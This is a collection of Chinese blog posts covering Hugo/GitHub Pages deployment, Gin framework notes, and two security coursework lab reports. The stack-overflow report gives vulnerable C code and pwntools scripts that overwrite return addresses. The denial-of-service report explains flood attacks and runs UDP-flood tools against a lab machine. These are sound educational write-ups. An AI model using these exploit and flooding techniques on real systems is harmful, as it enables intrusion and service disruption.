[{"content":"最近阿里云服务器到期，服务太贵了，所以就想着继续使用github作为博客搭建的方法。以前使用hexo作为静态博客工具。最近了解了一下hugo,发现Hugo的主题Hugo-PaperMod挺好看的，就了解了一下，并且结合github action 实现自动化部署。并从中学习到了一些git的命令，稍后也做一个整理便于加深印象。\nHugo-PaperMod 安装Hugo mac 环境直接brew install hugo即可安装hugo\n创建网站 命令hugo new site myblog可以建立站点\n目录如下：\n1 2 3 4 5 6 7 8 9 10 11 . ├── archetypes │ └── default.md // 这里是模版文件 ├── config.toml // 这里是配置文件 ├── content // 这里是文件内容 ├── data ├── layouts ├── static └── themes 6 directories, 2 files toml配置文件也可以改为yaml格式。\n配置主题 在themes下直接git clone git@github.com:adityatelange/hugo-PaperMod.git\n然后可以编写config.yaml文件了，需要注意的是需要把主题换为自己选择的主题:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 baseURL: http://www.reus09.top # baseURL: https://www.sulvblog.cn # 绑定的域名 languageCode: zh-cn # en-us title: Reus09\u0026#39;s Blog theme: hugo-PaperMod # 主题名字，和themes文件夹下的一致 enableInlineShortcodes: true enableEmoji: true # 允许使用 Emoji 表情，建议 true enableRobotsTXT: true # 允许爬虫抓取到搜索引擎，建议 true hasCJKLanguage: true # 自动检测是否包含 中文日文韩文 如果文章中使用了很多中文引号的话可以开启 buildDrafts: false buildFuture: false buildExpired: false #googleAnalytics: UA-123-45 # 谷歌统计 # Copyright: Sulv paginate: 10 # 首页每页显示的文章数 minify: disableXML: true # minifyOutput: true permalinks: post: \u0026#34;/:title/\u0026#34; # post: \u0026#34;/:year/:month/:day/:title/\u0026#34; defaultContentLanguage: en # 最顶部首先展示的语言页面 defaultContentLanguageInSubdir: true languages: en: languageName: \u0026#34;English\u0026#34; # contentDir: content/english weight: 1 profileMode: enabled: true title: (〃\u0026#39;▽\u0026#39;〃) subtitle: \u0026#34;修炼日记\u0026#34; imageUrl: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; imageTitle: imageWidth: 150 imageHeight: 150 buttons: - name: 👨🏻‍💻技术 url: posts/tech - name: 📕阅读 url: posts/read - name: 🏖生活 url: posts/life menu: main: - identifier: search name: 🔍搜索 url: search weight: 1 - identifier: home name: 🏠主页 url: / weight: 2 - identifier: posts name: 📚文章 url: posts weight: 3 # - identifier: tech # name: 👨🏻‍💻技术文章 # url: posts/tech # weight: 5 # - identifier: life # name: 🏖记录生活 # url: posts/life # weight: 6 - identifier: archives name: ⏱时间轴 url: archives/ weight: 20 # - identifier: categories # name: 🧩分类 # url: categories # weight: 30 - identifier: tags name: 🔖标签 url: tags weight: 40 - identifier: about name: 🙋🏻‍♂️关于 url: about weight: 50 - identifier: links name: 🤝友链 url: links weight: 60 outputs: home: - HTML - RSS - JSON params: env: production # to enable google analytics, opengraph, twitter-cards and schema. # description: \u0026#34;这是一个纯粹的博客......\u0026#34; author: Reus09 # author: [\u0026#34;Me\u0026#34;, \u0026#34;You\u0026#34;] # multiple authors ShowAllPagesInArchive: true defaultTheme: auto # defaultTheme: light or dark disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ShowShareButtons: true ShowReadingTime: true # disableSpecialistPost: true displayFullLangName: true ShowPostNavLinks: true ShowBreadCrumbs: true ShowCodeCopyButtons: true hideFooter: false # 隐藏页脚 ShowWordCounts: true VisitCount: true ShowLastMod: true #显示文章更新时间 ShowToc: true # 显示目录 TocOpen: true # 自动展开目录 comments: true socialIcons: - name: github url: \u0026#34;https://github.com/xyming108\u0026#34; - name: twitter url: \u0026#34;img/twitter.png\u0026#34; - name: facebook url: \u0026#34;https://www.facebook.com/profile.php?id=100027782410997\u0026#34; - name: instagram url: \u0026#34;img/instagram.png\u0026#34; - name: QQ url: \u0026#34;img/qq.png\u0026#34; - name: WeChat url: \u0026#34;img/wechat.png\u0026#34; # - name: Phone # url: \u0026#34;img/phone.png\u0026#34; - name: email url: \u0026#34;mailto:1931559710@qq.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; # editPost: # URL: \u0026#34;https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content\u0026#34; # Text: \u0026#34;Suggest Changes\u0026#34; # edit text # appendFilePath: true # to append file path to Edit link # label: # text: \u0026#34;Home\u0026#34; # icon: icon.png # iconHeight: 35 # analytics: # google: # SiteVerificationTag: \u0026#34;XYZabc\u0026#34; assets: favicon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon16x16: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon32x32: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; apple_touch_icon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; safari_pinned_tab: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; # cover: # hidden: true # hide everywhere but not in structured data # hiddenInList: true # hide on list pages and home # hiddenInSingle: true # hide on single page fuseOpts: isCaseSensitive: false shouldSort: true location: 0 distance: 1000 threshold: 1 minMatchCharLength: 0 keys: [\u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;] twikoo: version: 1.4.11 taxonomies: category: categories tag: tags series: series markup: goldmark: renderer: unsafe: true # HUGO 默认转义 Markdown 文件中的 HTML 代码，如需开启的话 highlight: # anchorLineNos: true codeFences: true guessSyntax: true lineNos: true # noClasses: false # style: monokai style: darcula # codeFences：代码围栏功能，这个功能一般都要设为 true 的，不然很难看，就是干巴巴的-代码文字，没有颜色。 # guessSyntax：猜测语法，这个功能建议设置为 true, 如果你没有设置要显示的语言则会自动匹配。 # hl_Lines：高亮的行号，一般这个不设置，因为每个代码块我们可能希望让高亮的地方不一样。 # lineNoStart：行号从编号几开始，一般从 1 开始。 # lineNos：是否显示行号，我比较喜欢显示，所以我设置的为 true. # lineNumbersInTable：使用表来格式化行号和代码,而不是 标签。这个属性一般设置为 true. # noClasses：使用 class 标签，而不是内嵌的内联样式 privacy: vimeo: disabled: false simple: true twitter: disabled: false enableDNT: true simple: true instagram: disabled: false simple: true youtube: disabled: false privacyEnhanced: true services: instagram: disableInlineCSS: true twitter: disableInlineCSS: true hugo 常用的命令:\nhugo server -D 本地演示 hugo new xxx/xxx.md 这里的xxx为content下面的目录下面的文档 hugo 生成静态文件 Github Action 配置以及联合域名解析 github操作 这里我们创建两个仓库，一个私有库存储博客源码，一个公开库，即xxxx.github.io.存储我们的博客静态网页。\n这里私有库 : blog public : reus09.github.io 配置tocken,因为我们需要从博客仓库推送到外部 GitHub Pages 仓库，需要特定权限，要在 GitHub 账户下 Setting - Developer setting - Personal access tokens 下创建一个 Token。需要开启权限repo和workflow\n配置后复制生成的 Token（注：只会出现一次），然后在我们博客源仓库(blog)的 Settings - Secrets - Actions 中添加 PERSONAL_TOKEN 环境变量为刚才的 Token，这样 GitHub Action 就可以获取到 Token 了。\n阿里云域名解析 制定记录类型为CNAME,然后主机记录分别为@和www，记录值为reus09.github.io，这里就是你的github博客地址，也可以通过ping xxxx.github.io 来获取其对应的真实IP地址。\ngit操作 在hugo初始的site:myblog下:\ngit init 初始化git仓库\n在myblog目录下建立.github/workflows/deploy.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 name: deploy on: push: workflow_dispatch: schedule: # Runs everyday at 8:00 AM - cron: \u0026#34;0 0 * * *\u0026#34; jobs: build: runs-on: ubuntu-20.04 steps: - name: Checkout uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; - name: Build Web run: hugo - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 with: # 这里即为 我们上文中为 blog 生成的secret PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }} # 这里指向自己的githubo 博客地址 EXTERNAL_REPOSITORY: reus09/reus09.github.io PUBLISH_BRANCH: master PUBLISH_DIR: ./public # 指定 CNAME CNAME: www.reus09.top commit_message: ${{ github.event.head_commit.message }} on 表示 GitHub Action 触发条件，我设置了 push、workflow_dispatch 和 schedule 三个条件：\npush，当这个项目仓库发生推送动作后，执行 GitHub Action workflow_dispatch，可以在 GitHub 项目仓库的 Action 工具栏进行手动调用 schedule，定时执行 GitHub Action，如我的设置为北京时间每天早上执行，主要是使用一些自动化统计 CI 来自动更新我博客的关于页面，如本周编码时间，影音记录等，如果你不需要定时功能，可以删除这个条件 jobs 表示 GitHub Action 中的任务，我们设置了一个 build 任务，runs-on 表示 GitHub Action 运行环境，我们选择了 ubuntu-latest。我们的 build 任务包含了 Checkout、Setup Hugo、Build Web 和 Deploy Web 四个主要步骤，其中 run 是执行的命令，uses 是 GitHub Action 中的一个插件，我们使用了 peaceiris/actions-hugo@v2 和 peaceiris/actions-gh-pages@v3 这两个插件。其中 Checkout 步骤中 with 中配置 submodules 值为 true 可以同步博客源仓库的子模块，即我们的主题模块。\n经过上述配置，我们已经实现了 Hugo 博客本地搭建及版本管理、GitHub Pages 部署网站发布，Hugp 主题管理及更新等功能，实现了完整的系统。现在每当我们本地通过熟悉的 Markdown 语法完成博客内容编辑后，只需要推送代码，等待几分钟，即可通过我们的自定义域名访问更新后的网站。\n1 2 3 4 git remote add origin git@github.com:reus09/blog.git git add -A git commit -m \u0026#34;test\u0026#34; git push -u origin master -f 即可实现自动化上传源码 问题 在上述配置好之后，push之后发现一个问题，在checkout有个问题\n即他在.gitmodules没有这个 submodule path\n于是我们在myblog目录下加入.gitmodules\n1 2 3 4 [submodule \u0026#34;themes/hugo-PaperMod\u0026#34;] path = themes/hugo-PaperMod url = https://github.com/adityatelange/hugo-PaperMod branch = master 发现就可以解决了 ","permalink":"http://www.reus09.top/posts/tech/hugo%E9%83%A8%E7%BD%B2github/","summary":"最近阿里云服务器到期，服务太贵了，所以就想着继续使用github作为博客搭建的方法。以前使用hexo作为静态博客工具。最近了解了一下hugo","title":"Hugo部署github"},{"content":"对开源的开发框架gin进行了简单的学习，对常用的进行了简单的整理。\n初始化 这里直接给出一个通用的模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main(){ // 使用默认中间件创建一个gin路由器 // logger and recovery (crash-free) 中间件 router := gin.Default() // 加载templates目录下的所有文件为html router.LoadHTMLGlob(\u0026#34;/templates/**\u0026#34;) router.GET(\u0026#34;/someGet\u0026#34;, getting) router.POST(\u0026#34;/somePost\u0026#34;, posting) router.PUT(\u0026#34;/somePut\u0026#34;, putting) router.DELETE(\u0026#34;/someDelete\u0026#34;, deleting) router.PATCH(\u0026#34;/somePatch\u0026#34;, patching) router.HEAD(\u0026#34;/someHead\u0026#34;, head) router.OPTIONS(\u0026#34;/someOptions\u0026#34;, options) // Simple group: v1 v1 := router.Group(\u0026#34;/v1\u0026#34;) {\t// /v1/login v1.POST(\u0026#34;/login\u0026#34;, loginEndpoint) v1.POST(\u0026#34;/submit\u0026#34;, submitEndpoint) v1.POST(\u0026#34;/read\u0026#34;, readEndpoint) } // 默认启动的是 8080端口，也可以自己定义启动端口 router.Run() // router.Run(\u0026#34;:3000\u0026#34;) for a hard coded port } gin.Default()初始了中间件，默认为logger和recovery,也可以通过gin.New()实现无中间件启动服务 同时gin也支持七种HTTP请求方式，方便后端业务增删改查的调用。 获取参数 Rest风格获取参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 此规则能够匹配/user/john这种格式，但不能匹配/user/ 或 /user这种格式 router.GET(\u0026#34;/user/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.String(http.StatusOK, \u0026#34;Hello %s\u0026#34;, name) }) // 但是，这个规则既能匹配/user/john/格式也能匹配/user/john/send这种格式 // 如果没有其他路由器匹配/user/john，它将重定向到/user/john/ router.GET(\u0026#34;/user/:name/*action\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) action := c.Param(\u0026#34;action\u0026#34;) message := name + \u0026#34; is \u0026#34; + action c.String(http.StatusOK, message) }) 可以通过:和*来实现restful风格的传参并获取。 常规获取参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 匹配的url格式: /welcome?firstname=Jane\u0026amp;lastname=Doe router.GET(\u0026#34;/welcome\u0026#34;, func(c *gin.Context) { firstname := c.DefaultQuery(\u0026#34;firstname\u0026#34;, \u0026#34;Guest\u0026#34;) lastname := c.Query(\u0026#34;lastname\u0026#34;) // 是 c.Request.URL.Query().Get(\u0026#34;lastname\u0026#34;) 的简写 c.String(http.StatusOK, \u0026#34;Hello %s %s\u0026#34;, firstname, lastname) }) // 传入的post 请求 router.POST(\u0026#34;/form_post\u0026#34;, func(c *gin.Context) { message := c.PostForm(\u0026#34;message\u0026#34;) nick := c.DefaultPostForm(\u0026#34;nick\u0026#34;, \u0026#34;anonymous\u0026#34;) // 此方法可以设置默认值 c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;posted\u0026#34;, \u0026#34;message\u0026#34;: message, \u0026#34;nick\u0026#34;: nick, }) }) 获取get请求的参数需要用到方法Query，DefaultQuery方法为某个参数设置默认值，在没有传入的情况下存在默认值。 获取POST的参数用的方法PostForm获取提交的数据，DefaultPostForm同样为设置默认值。 上传文件 gin对file封装的较为完善，文件上传用起来也比较方便，对于单个文件，直接通过FormFile获取传入对应的文件名即可，对于上传的多个文件，将其转化为文件数组即可。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 给表单限制上传大小 (默认 32 MiB) // router.MaxMultipartMemory = 8 \u0026lt;\u0026lt; 20 // 8 MiB router.POST(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { // 单文件 file, _ := c.FormFile(\u0026#34;file\u0026#34;) log.Println(file.Filename) // 多文件 form, _ := c.MultipartForm() files := form.File[\u0026#34;upload[]\u0026#34;] for _, file := range files { log.Println(file.Filename) } // 上传文件到指定的路径 // c.SaveUploadedFile(file, dst) c.String(http.StatusOK, fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39; uploaded!\u0026#34;, file.Filename)) }) 目录结构设计 从上到下目录结构为:\n文件 概要 config 配置文件对应的结构体定义 controller 业务层 dao 操作数据库,给业务controller提供数据 forms 字段验证的struct global 定义全局变量 initialize 服务初始化 logs 日志存储 middlewares 中间件 models 数据库字段定义 Response 统一封装response static 资源文件夹 router 路由 setting-dev.yaml 配置文件 main.go 服务启动文件 ","permalink":"http://www.reus09.top/posts/tech/gin/","summary":"对开源的开发框架gin进行了简单的学习，对常用的进行了简单的整理。 初始化 这里直接给出一个通用的模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","title":"Gin"},{"content":"栈溢出报告 0x01 目标 通过对程序输入的密码的长度、内容等修改用Ollydbg来验证缓冲区溢出的发生（参考提供的两个代码） 完成淹没相邻变量改变程序流程实验 完成淹没返回地址改变程序流程实验 附加题 以StackOverrun程序为靶子，通过自己使用ollydbg调试，两个要求：其一，要求分析PE格式加载到内存中的地址变化；其二，挑选其中一处函数的跳转，详细分析，跳转时sp，bp，ip的变化，要求以程序运行的顺序记录跳转时的这些寄存器的变化。 在没有源代码的情况下，先推测程序的功能，然后尝试修改StackOverrun程序的流程，通过淹没返回地址，比如可以尝试用jmp esp的方式（方式可以自选），让其调用bar函数并输出结果。 0x02 测试步骤和结果 2.1 overflow_var 淹没相邻变量 2.1.1 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8];// add local buff authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; while(1) { printf(\u0026#34;please input password: \u0026#34;); scanf(\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); break; } } system(\u0026#34;pause\u0026#34;); } 程序输入一个passoword,然后作为参数将其传递给函数verify_password函数里面\n在verify_password函数里面创建两个局部变量，authenticated参数最后作为返回，buffer参数存储传递进来的password，\nauthentiacted参数存储password和定义好的全局变量PASSWORD的经过strcmp函数之后的返回值，最后程序返回authentiacted。\n回到main函数之后，valid_flag存储的为上面的返回值，如果输入相同，即输出incorrect password!\\n\\n,其他情况，输出Congratulation! You have passed the verification!\\n。\n执行程序效果如图：\n2.1.2 ollydbg调试分析 通过IDA分析，我们可以确定main函数地址为0x4010A0 直接在ollydbg中设置断点，然后使程序 运行到该位置 local.1即为valid_flag的参数值 mov eax,0x01 test eax,eax即为实现while(1)循环 接下来printf,scanf，verify_password函数均如上图所示。 进入函数0x401440进行分析 我们首先输入密码123456 进入函数分析 发现我们eax存储的为我们输入的密码123456, 程序将PASSWORD和eax连个参数的地址均压入栈中。 真实的buffer存储在地址0x188FB44 可以看到经过函数strcmp之后的返回值存储在eax里面，然后赋值给[local.1] 然后buffer地址为0x18FAE0 进而我们发现authenticated参数的地址即为0x18FAE8，并且因为明显123456小于1234567，所以参数被覆盖为0xFFFFFFFF 输入密码1234567 我们发现authenticated参数的地址即为0x18FAE8，并且因为明显123456小于1234567，所以参数被覆盖为0x00000000 2.1.3 淹没相邻变量 因为子函数verify_password返回的值为authenticated的值，所以我们只需要覆盖掉这个参数，将其覆盖为0即可，满足我们的需求。 考虑到内存中小端存储的特点，加上buffer空间的大小为8字节，所以我们只需要输入八个字符，让字符串的截断符null覆盖掉参数authenticated即可满足条件。 我们这里输入密码123456# 用ollydbg看一下栈中内容变化 可以很清楚的看到参数被覆盖为0了。同时程序输出 2.2 overflow_ret 淹没返回地址 2.2.1 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; if(!(fp=fopen(\u0026#34;password.txt\u0026#34;,\u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp,\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); } fclose(fp); } 程序实现，读取文件password.txt的内容作为password\n然后将password作为参数传递给verify_password函数\n其余的分析过程与上述没有区别，不在赘述\npassword.txt填充123456\npassword.txt填充1234567\n2.2.2 IDA_PRO分析 我们这里需要覆盖掉子函数的返回地址，将其返回地址改为打印出Congratulation! You have passed the verification!\\n. 这里我们首先查看一下子函数verify_password的栈空间，buffer大小 IDA-PRO我们进入子函数，将其反汇编 v3即为buffer变量，v4代表authenticated 查看v3在内存中的分布情况 考虑到 strcpy函数并没有检验赋值的字符串长度，因此字符串可以溢出。 发现buffer数组填充0x0c+0x04个字符即可以覆盖到返回地址。 这里找到返回地址为0x40112f 2.2.3 淹没返回地址 根据上述分析，我们很容易根据pwntools写出相应的shellcode\n1 2 3 4 5 6 7 from pwn import * ret = 0x40112f payload = b\u0026#39;a\u0026#39;*0x10 + p32(ret) with open(\u0026#34;password.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) 可以比较清晰的看到ebp被覆盖为aaaa,返回地址也被覆盖为0x40112f\n0x03 测试结论 我们通过栈溢出两个例子，分别覆盖返回地址和相邻关键变量，通过strcpy对数组边界的没有要求，我们都可以成功的达到目标。 这充分证明我们在实际编程中要使用安全的函数s_scanf或者安全的strcpy函数，否则容易造成严重的栈溢出攻击。 同时呢，通过栈溢出我们可以劫持程序的EIP来到我们想运行的任何代码中，我们也可以恶意修改一些关键参数来达到攻击的目的。 简述一下覆盖相邻变量原理 这里我们通过越过数组buffer的边界， 利用字符串的截断符\\x00来覆盖掉参数authenticated，从而保证将其返回值修改恒为0。 简述一下覆盖范湖地址原理 我们这里直接利用超长的 buffer字符串，覆盖掉整个buffer,参数authenticated，ebp,将返回地址覆盖为我们需要的地址0x40112f 0x04 附加题 4.1 静态分析 使用IDA_Pro打开程序进行静态分析\n首先打印两个函数的地址0x401000,0x401060,然后将argv[1]作为参数传递给函数sub_101000 然后进入函数sub_401000查看函数功能 将输入的参数赋值给v2，然后打印赋值 前后两次的栈内空间变化。 进入函数sub_401060查看函数功能 打印出i have been hacked！ 在ollydbg中，将参数赋值为test，查看具体原理\n第一次打印栈中内容 赋值后打印栈中内容 4.2 PE加载内存地址变化 我们用010editor分析一下没有加载情况下的程序 相对应的text、rdata、data段地址分别为0x401000,0x405000,0x406000 我们可以看到PE结构分为四部分 其中Sections 分为text,data,rdata几部分。 0x1000h之前的数据都是用于程序加载用的，用于检验PE文件格式，计算文件偏移。 接下来看一下内存映像结构 因为程序加载用到相对虚拟地址,exe为0x400000, text段开头与加载后的对比 可以看到字节码是对应的 我们发现字符串静态下的情况位于data 段 这里以Now the stack looks like: 因此这里加载后的地址即为0x400000+0x6030 总而言之 RVA是在PE文件中为了避免使用确定的内存地址，出现了相对虚拟地址（Relative Virtual Address，简称RVA） – RVA是内存中相对于PE文件装入地址的偏移位置，是一个“相对地址”，或称为“偏移量 VA指的是进程装入内存后实际的内存地址，被称为虚拟地址（Virutal Address，简称VA） VA=Image Base + RVA 4.3 函数跳转寄存器变化 这里也以参数test为例子，分析一下进入foo前后栈帧的变化 这里发现栈顶esp存储的为test,eip此时指向的为call foo，ebp指向main函数的栈帧底部。 进入foo函数 一系列入栈操作 发现这个函数没有进行ebp处理， 所以ebp仍然为main函数的栈底 但是esp经过一系列的更新，进一步的向上扩张，同时eip指向foo函数的当前指令 执行完foo函数之后，回到main函数 发现esp,ebp回到进入foo函数之前的样子，eip执行调用call指令之后的下一条地址0x40109B 4.4 栈溢出调用bar 这里在IDA里面分析发现，要复制的字符串v2的空间如下：\n占据0x0c个字符之后，便为返回地址， 因此我们用0x0c个字符将其覆盖，在填充我们需要的函数地址0x401060即可达到目标\n利用pwntools易得脚本如下：\n1 2 3 4 5 6 7 from pwn import * ret = 0x00401060 payload = b\u0026#39;a\u0026#39;*0x0c +p32(ret) with open(\u0026#34;stackover.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) 将payload直接在命令行中输入，拿到shell\n","permalink":"http://www.reus09.top/posts/tech/%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"栈溢出报告 0x01 目标 通过对程序输入的密码的长度、内容等修改用Ollydbg来验证缓冲区溢出的发生（参考提供的两个代码） 完成淹没相邻变量改变程序流","title":"栈溢出"},{"content":"拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提知识 DoS（Denial of Service）攻击 凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。 DDoS（Distributed Denial of Service）攻击 借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站 DDoS攻击类型 基于操作系统/应用软件漏洞的DDoS攻击；\n基于协议漏洞的网络层DDoS攻击；\n利用协议漏洞，导致目标资源被大幅占用。是最常见的攻击方式，但需要一定规模的傀儡主机。 面向网络资源的DDoS攻击；\n攻击者控制傀儡机同时发送正常报文，导致目标资源被耗尽。这种攻击方式最难防范，攻击者也需要控制较大规模的主机或服务器 Ping of Death 攻击点：操作系统协议栈没有处理例外情况的设计缺陷。 原理：利用了协议实现时的漏洞（CVE-1999-0128）。ICMP协议用于诊断网络状况（端点是否可达等）。正常情况下，A向B发送ICMP echo request，B收到后返回ICMP echo reply。则A知道，B在线、可达。ICMP包除了包头外，还可以携带数据。这些数据不用于进一步处理，仅辅助诊断网络状况（根据收到响应的时间判断网络是否通畅）。攻击者制造超长数据包，使得数据包超过65535字节上限。没有异常处理的协议栈，收到这样的数据包，可能会由于缓存区溢出而崩溃。（IP数据包的最大长度为65535B，IP首部长度为20B，ICMP首部为8字节，ICMP包最大数据长度为：65535-20-8=65507B. Smurf 以目标IP为源地址，以广播地址为目地址，发送ICMP Echo请求。广播地址对应网络上的每台主机都能收到请求，并向目标发送ICMP Reply，导致目标被大量应答占据资源。 UdpSmurf 利用7号(echo)端口。根据协议，若端口开放，则回送应答UDP数据包。若端口关闭，则发送一个ICMP报文（目标不可达）。 攻击者以广播地址为目标地址，以受害者地址为源地址，使得大量应答包送往受害者。 TCP SYN Flood攻击 通过虚假的数据包，造成目标保存大量半开TCP连接。 管理TCP连接需要系统资源，系统能忍受的半开连接有上限。 当半开连接达到一定数目时，系统将不再接收新的连接请求。 正常的服务请求因此得不到响应。 TCP正常连接过程 A发送SYN包后死机或掉线 TCP协议头\nTCP伪首部\n伪首部共有 12 字节，包含 IP 协议头部的一些字段，有如下信息：32位源IP地址、32位目的IP地址、8位保留字节(置0)、8位传输层协议号(TCP是6，UDP是17)、16位TCP报文长度(TCP首部+数据)。 TCP 协议校验和计算三部分：TCP伪首部 + TCP头部 + TCP数据。 IP 头部\nTCP 协议通过一种名为 三次握手 的过程来建立客户端与服务端的连接，三次握手 过程的原理如图\n建立连接三次握手过程如下：\n客户端需要发送一个 SYN包 给服务端（包含了客户端初始化序列号），并且将连接的状态设置为 SYN_SENT，这个过程由 connect() 系统调用完成。\n服务端接收到客户端发送过来的 SYN包 后，回复一个 SYN+ACK包 给客户端（包含了服务端初始化序列号），并且设置连接的状态为 SYN_RCVD。\n客户端接收到服务端发送过来的 SYN+ACK包 后，设置连接状态为 ESTABLISHED（表示连接已经建立），并且回复一个 ACK包 给服务端。\n服务端接收到客户端发送过来的 ACK包 后，将连接状态设置为 ESTABLISHED（表示连接已经建立）。\n当 三次握手 过程完成后，一个 TCP 连接就此建立完成。\nSYN-flood攻击大概有以下三种攻击方式：\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 0x03 实验环境 部署于同一局域网下 攻击机 网络安全实验 Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 靶机 汇编 Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具： udp-Flood 阿拉丁 visual studio code wireshark 0x04 工具分析 udp_Flood 首先看一下靶机IP:192.168.195.135开放的端口\n发现TCP中21、22、80端口均开启，UDP开启445,500端口 首先在攻击机打开udp_flood工具，对80端口进行攻击。\n每秒发11个包 然后在靶机中打开Wireshark进行抓包\n容易发现，攻击机向靶机每发一个UDP包，靶机就会回应一个ICMP包\n不难发现，udp包的数据流都没有问题，所有udp包的大小相同，协议相同，短时间发送大量的包\n但是服务器回显ICMP显示Port Unreachable\n这是因为服务器响应发送到其中一个端口的UDP数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到UDP数据包时，会经过两个步骤：\n服务器首先检查是否正在运行正在侦听指定端口的请求的程序。 如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应，以通知发送方目的地不可达。 80端口并没有UDP进行监听，因此服务器会返回一个ICMP包，告诉发送方不可到达。\n这里利用UDP开始监听的445端口进行实验\nudp发送的包同样没有问题，大小相同，均为83。 这里查看一下udp_flood攻击之前的时间\n然后打开udp_flood，攻击80端口 可以看到阿拉丁udp_flood攻击之后，访问百度会丢包，然后平均时间也增加了 因此，udp_flood一定程度上会阻碍服务器的访问速度。 因此，在udp_flood攻击中，攻击者可发送大量伪造源IP地址的小udp包。由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击方式消耗的是攻击者与靶机方两方资源的比拼。\n阿拉丁 首先查看一下靶机开放的端口 在攻击机中打开阿拉丁udp洪水攻击器 首先工具靶机的80端口 便于测试，这里进行一般udp攻击 在靶机中跟据Wireshark进行抓包 